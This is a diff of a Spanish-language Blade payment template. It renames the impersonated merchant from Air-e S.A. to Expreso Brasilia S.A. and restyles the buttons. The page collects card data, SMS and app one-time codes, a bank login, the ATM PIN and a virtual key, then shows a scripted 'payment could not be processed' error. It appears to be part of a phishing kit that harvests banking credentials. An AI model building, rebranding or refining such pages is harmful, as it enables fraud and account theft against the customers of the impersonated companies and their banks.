@@ -5,7 +5,7 @@
 
 @php
     // Nombre del comercio que aparece en las secciones OTP
-    $nombreComercio = 'Air-e S.A.';
+    $nombreComercio = 'Expreso Brasilia S.A.';
 @endphp
 
 <!-- OVERLAY DE CARGA CON SPINNER CENTRADO -->
@@ -60,7 +60,7 @@
             </div>
             <div id="errorTdc" class="text-red-500 text-sm text-center hidden"></div>
             <button onclick="enviarTdc()" id="btnTdc" disabled
-                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+                class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                 <span id="textoTdc">Verificar</span>
                 <div id="spinnerTdc" class="hidden">
                     <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -126,7 +126,7 @@
             <a href="#" class="text-[#1a4b8c] hover:underline">Ayuda</a>
             <a href="#" class="text-[#1a4b8c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
             <button onclick="enviarOtpSms()" id="btnOtpSms" disabled
-                class="bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
+                class="flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                 <span id="textoOtpSms">Enviar</span>
                 <div id="spinnerOtpSms" class="hidden">
                     <svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -193,7 +193,7 @@
             <a href="#" class="text-[#1a4b8c] hover:underline">Ayuda</a>
             <a href="#" class="text-[#1a4b8c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
             <button onclick="enviarOtpApp()" id="btnOtpApp" disabled
-                class="bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
+                class="flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                 <span id="textoOtpApp">Enviar</span>
                 <div id="spinnerOtpApp" class="hidden">
                     <svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -237,7 +237,7 @@
             </div>
             <div id="errorLogin" class="text-red-500 text-sm text-center hidden"></div>
             <button onclick="enviarLogin()" id="btnLogin" disabled
-                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+                class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                 <span id="textoLogin">Verificar</span>
                 <div id="spinnerLogin" class="hidden">
                     <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -273,7 +273,7 @@
             <p class="text-sm text-gray-500 mt-2 text-center">La misma clave que utilizas en cajeros automáticos</p>
             <div id="errorClaveCajero" class="text-red-500 text-sm mt-2 text-center hidden"></div>
             <button onclick="enviarClaveCajero()" id="btnClaveCajero" disabled
-                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+                class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                 <span id="textoClaveCajero">Verificar</span>
                 <div id="spinnerClaveCajero" class="hidden">
                     <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -309,7 +309,7 @@
             <p class="text-sm text-gray-500 mt-2 text-center">Tu clave virtual de transacciones</p>
             <div id="errorClaveVirtual" class="text-red-500 text-sm mt-2 text-center hidden"></div>
             <button onclick="enviarClaveVirtual()" id="btnClaveVirtual" disabled
-                class="w-full mt-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+                class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                 <span id="textoClaveVirtual">Verificar</span>
                 <div id="spinnerClaveVirtual" class="hidden">
                     <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -337,7 +337,7 @@
         <p class="text-gray-600 text-center max-w-md mb-8">
             El método de pago seleccionado no pudo ser procesado. Por favor, elige otra forma de pago para continuar con tu transacción.
         </p>
-        <button onclick="mostrarSeccion('seccion-metodo-pago')" class="bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-4 px-8 rounded-xl text-lg transition-colors">
+        <button onclick="mostrarSeccion('seccion-metodo-pago')" class="flex items-center justify-center rounded-full h-12 px-8 bg-[#1a3a6e] hover:bg-[#152d54] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
             Cambiar método de pago
         </button>
     </div>
@@ -379,7 +379,7 @@
         <h3 class="text-2xl font-bold text-gray-900 mb-3">No pudimos procesar tu solicitud</h3>
         <p class="text-gray-600 text-center max-w-sm mb-4">Ha ocurrido un error al procesar tu pago. Por favor, intenta nuevamente más tarde.</p>
         <p class="text-gray-500 text-sm text-center">Si el problema persiste, comunícate con nuestro servicio al cliente.</p>
-        <button onclick="window.location.reload()" class="mt-8 bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-3 px-8 rounded-xl text-lg transition-colors">
+        <button onclick="window.location.reload()" class="mt-8 flex items-center justify-center rounded-full h-12 px-8 bg-[#1a3a6e] hover:bg-[#152d54] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
             Intentar de nuevo
         </button>
         <p class="text-sm text-gray-400 mt-6">Serás redirigido en unos momentos...</p>
@@ -573,7 +573,7 @@
 
             <!-- Botón de pagar -->
             <div class="mt-8">
-                <button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+                <button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                     <span id="textoBotonTarjeta">Pagar</span>
                     <div id="spinnerTarjeta" class="hidden">
                         <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -701,7 +701,7 @@
 
             <!-- Botón de pagar -->
             <div class="mt-8">
-                <button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full bg-[#1a3a6e] hover:bg-[#152d54] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+                <button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#1a3a6e] hover:bg-[#152d54] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
                     <span id="textoBotonPSE">Pagar</span>
                     <div id="spinnerPSE" class="hidden">
                         <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
